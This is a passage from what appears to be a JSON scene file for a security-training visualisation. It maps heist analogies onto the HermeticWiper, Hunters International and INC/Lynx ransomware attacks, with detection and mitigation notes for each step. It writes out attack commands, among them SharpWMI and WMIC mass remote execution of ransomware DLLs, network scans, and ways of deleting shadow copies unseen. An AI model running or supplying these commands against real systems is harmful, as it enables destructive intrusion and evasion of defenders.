          "title": "Shattering the floor index catalog into…",
          "subtitle": "Fragmenting NTFS metadata structures ($Bitmap, $LogFile, $MFT)…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Then",
          "stageTag": "STEP 02 · SETUP",
          "title": "Pulling power plugs on the backup vault and crash…",
          "storyExcerpt": "Before swinging the sledgehammer, the saboteur pulls the power plugs on the building automatic backup vault and crash-diary recorder, then deliberately shatters the floor index catalog into…",
          "technicalParallel": "By parsing the NTFS $MFT runlist fragments directly rather than using standard Windows file APIs, HermeticWiper could corrupt the exact physical sectors backing critical OS metadata even while Windows…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Shattering the floor index catalog into fragments",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses shattering the floor index catalog into fragments to advance toward preventing forensic recovery teams from rebuilding files.",
          "technicalParallel": "HermeticWiper called ChangeServiceConfigW and ControlService to disable and stop the vss (Volume Shadow Copy) service, set HKLM\\SYSTEM\\CurrentControlSet\\Control\\CrashControl\\CrashDumpEnabled = 0…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Room",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Covering every internal storage room",
          "storyExcerpt": "Behind the scenes, covering every internal storage room captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Windows System EventID 7040 (vss service disabled) and Registry EventID 13 (CrashControl\\CrashDumpEnabled set to 0).",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Driver Gate",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Boot Furnace",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Wipe Stream",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1490"
    },
    "step-3": {
      "scenarioId": "hermeticwiper-ukraine-easeus-mbr-wipe",
      "sectionKey": "step-3",
      "sceneKind": "ran-hermeticwiper-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "Raw \\\\.\\PhysicalDrive0..100 MBR & NTFS $MFT Overwrite with CSPRNG Bytes",
      "storyCue": "Walking methodically from storage bay zero up to bay one hundred, the saboteur uses its raw disk pass to blast every drive opening directory and master file catalog with irreversible random noise, then flips the building power breaker so no machine ever boots again.",
      "technicalCue": "T1561.002 · EXFIL & IMPACT — Iterating through \\\\.\\PhysicalDrive0 up to \\\\.\\PhysicalDrive100, HermeticWiper generated cryptographically random bytes via CryptGenRandom and overwrote the Master Boot Record (MBR) (first 512…",
      "storyMappings": [
        {
          "storyTerm": "Walking from storage bay zero up to bay one hundred",
          "technicalTerm": "Iterating handles across \\\\.\\PhysicalDrive0 through \\\\.\\PhysicalDrive100",
          "tone": "amber"
        },
        {
          "storyTerm": "Blasting opening directories with irreversible random noise",
          "technicalTerm": "CryptGenRandom CSPRNG bytes overwriting MBR sector 0 and NTFS $MFT",
          "tone": "sky"
        },
        {
          "storyTerm": "Flipping the building power breaker",
          "technicalTerm": "Forced InitiateSystemShutdownEx locking victims out of unbootable hosts",
          "tone": "rose"
        },
        {
          "storyTerm": "Pre-emptive shield blocking raw disk strikes",
          "technicalTerm": "WDAC driver blocklist for empntdrv.sys and EDR blocking raw WriteFile to sector 0",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-hermeticwiper-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Walking from storage bay zero up to bay…",
          "subtitle": "Iterating handles across \\\\.\\PhysicalDrive0 through…",
          "tone": "amber"
        },
        {
          "id": "ran-hermeticwiper-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Blasting opening directories with…",
          "subtitle": "CryptGenRandom CSPRNG bytes overwriting MBR sector 0 and NTFS…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Bay Zero",
          "stageTag": "STEP 03 · SETUP",
          "title": "Walking from storage bay zero up to bay one hundred",
          "storyExcerpt": "Walking methodically from storage bay zero up to bay one hundred, the saboteur uses its raw disk pass to blast every drive opening directory and master file catalog with irreversible random…",
          "technicalParallel": "Because the $MFT (which maps where every file resides on an NTFS volume) and $MFTMirr are overwritten with random bytes from CryptGenRandom, carving or recovering filesystem structure is rendered…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Blasting opening directories with irreversible…",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses blasting opening directories with irreversible random noise to advance toward flipping the building power breaker.",
          "technicalParallel": "Iterating through \\\\.\\PhysicalDrive0 up to \\\\.\\PhysicalDrive100, HermeticWiper generated cryptographically random bytes via CryptGenRandom and overwrote the Master Boot Record (MBR) (first 512 bytes of…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Pre-emptive Raw",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Pre-emptive shield blocking raw disk strikes",
          "storyExcerpt": "Behind the scenes, pre-emptive shield blocking raw disk strikes captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Block empntdrv.sys via Windows Defender Application Control (WDAC kernel driver allowlisting) and enforce EDR kernel disk filters blocking unauthorized raw WriteFile operations targeting sector 0 of…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Driver Gate",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Boot Furnace",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Wipe Stream",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1561.002"
    }
  },
  "hunters-international-hive-rust-wsus-sharpwmi": {
    "briefing": {
      "scenarioId": "hunters-international-hive-rust-wsus-sharpwmi",
      "sectionKey": "briefing",
      "sceneKind": "ran-hunters-intl-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1047",
      "title": "Hunters International Ransomware: Hive Rust Lineage, SharpWMI Lateral… — Story-to-Technical Overview",
      "storyCue": "Imagine a successor heist crew that buys the blueprint of an infamous retired vault-cracking machine and upgrades it to run even cleaner and quieter. First, they send remote maintenance orders to wipe backup catalogs; next, instead of loudly shouting the usual shadow-shredder command that wakes every hallway guard, they quietly walk up to the vault backup engine itself and whisper a direct internal delete order; finally, they run a fast multi-lane Rust padlocking press and sweep the empty floor clean so deleted scraps can never be pieced back together.",
      "technicalCue": "LATERAL & C2: SharpWMI Remote Execution & Backup Catalog Destruction (`wbadmin`) -> EXFIL & IMPACT: Direct COM `IVssBackupComponents::DeleteSnapshots` API Call (Commandless VSS Wipe) -> EXFIL & IMPACT: Multi-Threaded Rust Encryption & Free-Space Wiping (`.locked` / `Contact Us.txt`)",
      "storyMappings": [
        {
          "storyTerm": "Sending remote orders to wipe backup catalogs",
          "technicalTerm": "SharpWMI.exe lateral execution invoking wbadmin delete catalog",
          "tone": "amber"
        },
        {
          "storyTerm": "Whispering a direct internal delete order instead of shouting",
          "technicalTerm": "Commandless COM IVssBackupComponents::DeleteSnapshots bypassing vssadmin CLI alerts",
          "tone": "sky"
        },
        {
          "storyTerm": "Upgraded multi-lane Rust padlocking press",
          "technicalTerm": "Hunters International Rust encryptor evolved from Hive codebase (.locked)",
          "tone": "rose"
        },
        {
          "storyTerm": "Sweeping empty floor space so scraps cannot be recovered",
          "technicalTerm": "Free-space wiping after encryption alongside Contact Us.txt ransom notes",
          "tone": "emerald"
        }
      ],
      "accentHex": "#A855F7",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "ran-hunters-intl-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Sending remote orders to wipe backup…",
          "subtitle": "SharpWMI.exe lateral execution invoking wbadmin delete catalog",
          "tone": "amber"
        },
        {
          "id": "ran-hunters-intl-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Whispering a direct internal delete…",
          "subtitle": "Commandless COM IVssBackupComponents::DeleteSnapshots…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Desk",
          "stageTag": "STAGE 01 · LATERAL & C2",
          "title": "SharpWMI Remote Execution & Backup Catalog Destruction (`wbadmin`)",
          "storyExcerpt": "From a hijacked supervisor desk, the crew dispatches lightweight remote management commands down the corporate wiring to erase the building official backup directory catalog before any locking begins.",
          "technicalParallel": "Under the hood, the observed step executes SharpWMI.exe action=exec computername=srv-db01.corp.local command=\"C:\\ProgramData\\hunters.exe\" (which executes the technical command / telemetry directive…",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Line",
          "stageTag": "STAGE 02 · EXFIL & IMPACT",
          "title": "Direct COM `IVssBackupComponents::DeleteSnapshots` API Call (Commandless VSS Wipe)",
          "storyExcerpt": "Knowing that security sensors watch closely for the noisy standard shadow-copy command tool, the Rust program skips the command line altogether and speaks directly to the operating system internal backup…",
          "technicalParallel": "Under the hood, the observed step executes CoCreateInstance(CLSID_VssBackupComponents..., IID_IVssBackupComponents, &pVss) (which executes the technical command / telemetry directive , CoCreateInstance…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Rust Hive",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "Multi-Threaded Rust Encryption & Free-Space Wiping (`.locked` / `Contact Us.txt`)",
          "storyExcerpt": "With every backup gone, the streamlined Rust locking press races across every storage aisle sealing files under a locked tag, scrubs blank shelf space to prevent undelete forensics, and leaves neat…",
          "technicalParallel": "Under the hood, the observed step executes hunters.exe (Rust Tokio/Rayon thread pool encrypts local & mounted volumes -> *.locked) (which executes the technical command / telemetry directive…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Update Mast",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Fleet Vault",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Lock Wave",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "hunters-international-hive-rust-wsus-sharpwmi",
      "sectionKey": "step-1",
      "sceneKind": "ran-hunters-intl-step-1",
      "stageBadge": "STEP #1 · LATERAL & C2",
      "title": "SharpWMI Remote Execution & Backup Catalog Destruction (wbadmin)",
      "storyCue": "From a hijacked supervisor desk, the crew dispatches lightweight remote management commands down the corporate wiring to erase the building official backup directory catalog before any locking begins.",
      "technicalCue": "T1047 · LATERAL & C2 — Operating from a compromised administrative workstation, Hunters International operators use SharpWMI.exe (action=exec) and Impacket wmiexec.py to stage the Rust-compiled encryptor across…",
      "storyMappings": [
        {
          "storyTerm": "Hijacked supervisor desk",
          "technicalTerm": "Compromised administrative workstation initiating lateral movement",
          "tone": "amber"
        },
        {
          "storyTerm": "Lightweight remote management orders",
          "technicalTerm": "SharpWMI.exe executing remote commands over WMI across domain servers",
          "tone": "sky"
        },
        {
          "storyTerm": "Erasing the official backup directory catalog",
          "technicalTerm": "wbadmin delete catalog removing Windows Backup recovery metadata",
          "tone": "rose"
        },
        {
          "storyTerm": "Clearing the runway for extortion",
          "technicalTerm": "Eliminating server-level recovery options prior to mass encryption",
          "tone": "emerald"
        }
      ],
      "accentHex": "#A855F7",
      "secondaryHex": "#A855F7",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-hunters-intl-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Hijacked supervisor desk",
          "subtitle": "Compromised administrative workstation initiating lateral…",
          "tone": "amber"
        },
        {
          "id": "ran-hunters-intl-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Lightweight remote management orders",
          "subtitle": "SharpWMI.exe executing remote commands over WMI across domain…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Desk",
          "stageTag": "STEP 01 · SETUP",
          "title": "Hijacked supervisor desk",
          "storyExcerpt": "From a hijacked supervisor desk, the crew dispatches lightweight remote management commands down the corporate wiring to erase the building official backup directory catalog before any locking…",
          "technicalParallel": "Under the hood, the observed step executes SharpWMI.exe action=exec computername=srv-db01.corp.local command=\"C:\\ProgramData\\hunters.exe\" (which executes the technical command / telemetry directive…",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Lightweight remote management orders",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses lightweight remote management orders to advance toward erasing the official backup directory catalog.",
          "technicalParallel": "Operating from a compromised administrative workstation, Hunters International operators use SharpWMI.exe (action=exec) and Impacket wmiexec.py to stage the Rust-compiled encryptor across target servers…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Desk Crew",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Clearing the runway for extortion",
          "storyExcerpt": "Behind the scenes, clearing the runway for extortion captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 1 (recording LateralMovement=SharpWMI / WMI Win32_Process.Create , wmiprvse.exe, CodeLineage=Hive v6 Rust Source Code -> Hunters International under T1047): Monitor…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Update Mast",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Fleet Vault",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Lock Wave",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1047"
    },
    "step-2": {
      "scenarioId": "hunters-international-hive-rust-wsus-sharpwmi",
      "sectionKey": "step-2",
      "sceneKind": "ran-hunters-intl-step-2",
      "stageBadge": "STEP #2 · EXFIL & IMPACT",
      "title": "Direct COM IVssBackupComponents::DeleteSnapshots API Call (Commandless VSS Wipe)",
      "storyCue": "Knowing that security sensors watch closely for the noisy standard shadow-copy command tool, the Rust program skips the command line altogether and speaks directly to the operating system internal backup clerk through its private office door to erase every snapshot in silence.",
      "technicalCue": "T1490 · EXFIL & IMPACT — To evade SIEM rules that watch for vssadmin.exe delete shadows or wmic.exe shadowcopy delete, the Hunters International Rust binary initializes COM (CoCreateInstance for…",
      "storyMappings": [
        {
          "storyTerm": "Skipping the noisy command line altogether",
          "technicalTerm": "Avoiding vssadmin.exe delete shadows and wmic.exe shadowcopy delete SIEM rules",
          "tone": "amber"
        },
        {
          "storyTerm": "Speaking directly through the backup clerk private door",
          "technicalTerm": "Direct COM API call to IVssBackupComponents::DeleteSnapshots in memory",
          "tone": "sky"
        },
        {
          "storyTerm": "Erasing every snapshot in silence",
          "technicalTerm": "Commandless Volume Shadow Copy deletion leaving zero CLI process artifacts",
          "tone": "rose"
        },
        {
          "storyTerm": "Catching the quiet internal call",
          "technicalTerm": "Monitoring VSS EventID 8224 / COM telemetry rather than CLI strings alone",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#A855F7",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-hunters-intl-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Skipping the noisy command line altogether",
          "subtitle": "Avoiding vssadmin.exe delete shadows and wmic.exe shadowcopy…",
          "tone": "amber"
        },
        {
          "id": "ran-hunters-intl-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Speaking directly through the backup…",
          "subtitle": "Direct COM API call to IVssBackupComponents::DeleteSnapshots…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Line",
          "stageTag": "STEP 02 · SETUP",
          "title": "Skipping the noisy command line altogether",
          "storyExcerpt": "Knowing that security sensors watch closely for the noisy standard shadow-copy command tool, the Rust program skips the command line altogether and speaks directly to the operating system…",
          "technicalParallel": "Under the hood, the observed step executes CoCreateInstance(CLSID_VssBackupComponents..., IID_IVssBackupComponents, &pVss) (which executes the technical command / telemetry directive , CoCreateInstance…",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Door",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Speaking directly through the backup clerk private…",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses speaking directly through the backup clerk private door to advance toward erasing every snapshot in silence.",
          "technicalParallel": "To evade SIEM rules that watch for vssadmin.exe delete shadows or wmic.exe shadowcopy delete, the Hunters International Rust binary initializes COM (CoCreateInstance for CLSID_VssBackupComponents in…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Call",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Catching the quiet internal call",
          "storyExcerpt": "Behind the scenes, catching the quiet internal call captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 7 (recording EvasionTechnique=In-Process COM IVssBackupComponents::DeleteSnapshots, LoadedModule=C:\\Windows\\System32\\vssapi.dll , Sysmon EventID 7, MitreTechnique=T1490…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Update Mast",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Fleet Vault",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Lock Wave",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1490"
    },
    "step-3": {
      "scenarioId": "hunters-international-hive-rust-wsus-sharpwmi",
      "sectionKey": "step-3",
      "sceneKind": "ran-hunters-intl-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "Multi-Threaded Rust Encryption & Free-Space Wiping (.locked / Contact Us.txt)",
      "storyCue": "With every backup gone, the streamlined Rust locking press races across every storage aisle sealing files under a locked tag, scrubs blank shelf space to prevent undelete forensics, and leaves neat negotiation cards in every cabinet.",
      "technicalCue": "T1486 · EXFIL & IMPACT — Unlike Hive’s custom dual-key table cipher, Hunters International simplifies the encryption pipeline for speed and reliability, terminating processes holding file locks, encrypting files in…",
      "storyMappings": [
        {
          "storyTerm": "Streamlined Rust locking press evolved from Hive",
          "technicalTerm": "Hunters International multi-threaded Rust encryptor simplifying Hive encryption",
          "tone": "amber"
        },
        {
          "storyTerm": "Scrubbing blank shelf space against undelete tools",
          "technicalTerm": "Post-encryption free-space wiping preventing forensic carving of plaintext files",
          "tone": "sky"
        },
        {
          "storyTerm": "Locked tag stamped on every file",
          "technicalTerm": "Encrypted documents renamed with the .locked extension",
          "tone": "rose"
        },
        {
          "storyTerm": "Negotiation cards left in every cabinet",
          "technicalTerm": "Contact Us.txt extortion note directing victims to leak-site chat",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-hunters-intl-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Streamlined Rust locking press evolved…",
          "subtitle": "Hunters International multi-threaded Rust encryptor…",
          "tone": "amber"
        },
        {
          "id": "ran-hunters-intl-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Scrubbing blank shelf space against…",
          "subtitle": "Post-encryption free-space wiping preventing forensic carving…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Rust Hive",
          "stageTag": "STEP 03 · SETUP",
          "title": "Streamlined Rust locking press evolved from Hive",
          "storyExcerpt": "With every backup gone, the streamlined Rust locking press races across every storage aisle sealing files under a locked tag, scrubs blank shelf space to prevent undelete forensics, and leaves…",
          "technicalParallel": "Under the hood, the observed step executes hunters.exe (Rust Tokio/Rayon thread pool encrypts local & mounted volumes -> *.locked) (which executes the technical command / telemetry directive…",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Tag",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Scrubbing blank shelf space against undelete tools",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses scrubbing blank shelf space against undelete tools to advance toward locked tag stamped on every file.",
          "technicalParallel": "Unlike Hive’s custom dual-key table cipher, Hunters International simplifies the encryption pipeline for speed and reliability, terminating processes holding file locks, encrypting files in parallel Rust…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Tag File",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Negotiation cards left in every cabinet",
          "storyExcerpt": "Behind the scenes, negotiation cards left in every cabinet captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 11 (recording RansomwareFamily=Hunters International, RansomNote=Contact Us.txt, FileExtension=.locked under T1486): Block outbound Tor traffic at the perimeter and enforce…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Update Mast",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Fleet Vault",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Lock Wave",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1486"
    }
  },
  "inc-ransom-lynx-citrix-netscaler-wmic-mega": {
    "briefing": {
      "scenarioId": "inc-ransom-lynx-citrix-netscaler-wmic-mega",
      "sectionKey": "briefing",
      "sceneKind": "ran-inc-lynx-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1046",
      "title": "INC Ransom & Lynx: Citrix NetScaler Exploitation, wmic.exe Distributed… — Story-to-Technical Overview",
      "storyCue": "Imagine a burglary crew that breaks in through a cracked front-door security gateway, scans every hallway to ship boxes of files out to a public cloud storage locker, copies a compact padlocking cartridge onto every office desk using an automated list of room numbers, and then locks every cabinet while printing out ransom demands straight through every office paper printer across the building.",
      "technicalCue": "CREDENTIAL ACCESS: Edge Appliance Compromise, NetScan Discovery & MEGASync Cloud Exfiltration -> LATERAL & C2: Mass WMIC `/node:@\"hosts.txt\"` DLL Distribution & `rundll32.exe` Execution -> EXFIL & IMPACT: AES-128-CTR + Curve25519 Encryption, Wallpaper Change & Network Printer Ransom Notes",
      "storyMappings": [
        {
          "storyTerm": "Cracked front-door gateway and cloud storage locker shipment",
          "technicalTerm": "Citrix NetScaler ADC breach, NetScan discovery, and MEGASync cloud exfiltration",
          "tone": "amber"
        },
        {
          "storyTerm": "Copying a padlocking cartridge down an automated list of rooms",
          "technicalTerm": "WMIC /node:@\"hosts.txt\" mass DLL staging and rundll32.exe execution",
          "tone": "sky"
        },
        {
          "storyTerm": "Fast modern locks across every office cabinet",
          "technicalTerm": "INC Ransom / Lynx AES-128-CTR and Curve25519 file encryption",
          "tone": "rose"
        },
        {
          "storyTerm": "Printing ransom demands straight through every office paper printer",
          "technicalTerm": "Desktop wallpaper change plus physical network printer ransom note printing",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#38BDF8",
      "durationSec": 18,
      "callouts": [
        {
          "id": "ran-inc-lynx-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Cracked front-door gateway and cloud…",
          "subtitle": "Citrix NetScaler ADC breach, NetScan discovery, and MEGASync…",
          "tone": "amber"
        },
        {
          "id": "ran-inc-lynx-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Copying a padlocking cartridge down an…",
          "subtitle": "WMIC /node:@\"hosts.txt\" mass DLL staging and rundll32.exe…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Edge",
          "stageTag": "STAGE 01 · CREDENTIAL ACCESS",
          "title": "Edge Appliance Compromise, NetScan Discovery & MEGASync Cloud Exfiltration",
          "storyExcerpt": "Slipping past an unpatched edge access gateway into the corporate interior, the crew runs a swift floor scanner to chart every active room and uploads stolen corporate files directly to an outside…",
          "technicalParallel": "Under the hood, the observed step executes netscan.exe /range:10.10.0.1-10.10.255.254 /save:C:\\Windows\\Temp\\hosts.txt (which executes the technical command / telemetry directive , netscan.exe…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Neat Room",
          "stageTag": "STAGE 02 · LATERAL & C2",
          "title": "Mass WMIC `/node:@\"hosts.txt\"` DLL Distribution & `rundll32.exe` Execution",
          "storyExcerpt": "Holding a neat roster of every room number in the building, the operator copies a compact padlocking cartridge into each room temporary closet and uses the building built-in remote runner to trigger…",
          "technicalParallel": "Under the hood, the observed step executes wmic.exe /node:@\"C:\\Windows\\Temp\\hosts.txt\" /user:\"CORP\\DomainAdmin\" /password:\"*\" process call create \"rundll32.exe C:\\Windows\\Temp\\inc.dll,Main --fast\" (which…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Fast",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "AES-128-CTR + Curve25519 Encryption, Wallpaper Change & Network Printer Ransom Notes",
          "storyExcerpt": "As modern elliptical-key padlocks clamp down on every document, the crew flips every monitor screen to a stark warning banner and even sends their ransom letter straight to every networked paper printer…",
          "technicalParallel": "Under the hood, the observed step executes rundll32.exe C:\\Windows\\Temp\\lynx.dll,Main (AES-128-CTR + Curve25519 encryption -> *.LYNX & README.txt) (which executes Microsoft's signed rundll32.exe host…",
          "accentHex": "#38BDF8",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Edge Gateway",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Note Printer",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Lock Wave",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "inc-ransom-lynx-citrix-netscaler-wmic-mega",
      "sectionKey": "step-1",
      "sceneKind": "ran-inc-lynx-step-1",
      "stageBadge": "STEP #1 · CREDENTIAL ACCESS",
      "title": "Edge Appliance Compromise, NetScan Discovery & MEGASync Cloud Exfiltration",
